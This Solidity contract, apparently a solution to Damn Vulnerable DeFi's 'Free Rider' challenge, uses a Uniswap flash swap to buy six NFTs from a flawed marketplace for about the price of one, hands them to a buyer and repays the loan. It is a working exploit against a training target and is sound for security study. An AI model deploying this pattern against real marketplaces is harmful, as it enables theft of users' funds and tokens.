// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "hardhat/console.sol";

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface IMarketPlace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

// As interface for avoiding pragma mismatch. Also saves gas.
interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint256 value) external returns (bool);

    function withdraw(uint256) external;

    function balanceOf(address) external returns (uint256);
}

contract FreeRiderAttack is IERC721Receiver {
    IMarketPlace private immutable market;
    IWETH private immutable weth;
    IUniswapV2Pair private immutable uniswap;
    IERC721 private immutable nft;
    address private immutable buyer;

    // Tokens to buy
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address marketPlace_,
        address wethAddress_,
        address uniswap_,
        address nft_,
        address buyer_
    ) {
        market = IMarketPlace(marketPlace_);
        weth = IWETH(wethAddress_);
        uniswap = IUniswapV2Pair(uniswap_);
        nft = IERC721(nft_);
        buyer = buyer_;
    }

    function callFlashLoan(uint256 wethAmountRequested_) external payable {
        bytes memory _data = "1";
        // Do a flash swap to get WETH
        uniswap.swap(
            wethAmountRequested_,
            0, // amount1 => DVT
            address(this), // recipient of flash swap
            _data // passed to uniswapV2Call function that uniswapPair triggers on the recipient (this)
        );
    }

    // Function called by UniswapPair when making the flash swap
    function uniswapV2Call(
        address, // sender
        uint256 amount_,
        uint256,
        bytes calldata
    ) external {
        console.log("weth1: ", weth.balanceOf(address(this)));
        console.log("eth 1: ", address(this).balance);
        // get the ETH by putting WETH
        weth.withdraw(amount_);
        // Buy NFTs
        address marketPayable = payable(address(market));
        (bool nftsBought, ) = marketPayable.call{value: amount_}(
            abi.encodeWithSignature("buyMany(uint256[])", tokenIds)
        );
        console.log("nftsBought: ", nftsBought);
        console.log("bal attacker : ", nft.balanceOf(address(this)));
        console.log("weth2: ", weth.balanceOf(address(this)));
        console.log("eth 2: ", address(this).balance);

        // transfer to buyer
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        // get back the WETH
        uint256 contractEthBalance = address(this).balance;
        weth.deposit{value: contractEthBalance}();

        // Pay back the flash swap with fee included
        uint256 contractWEthBalance = weth.balanceOf(address(this));
        weth.transfer(address(uniswap), contractWEthBalance);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        _tokenId = 0;
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
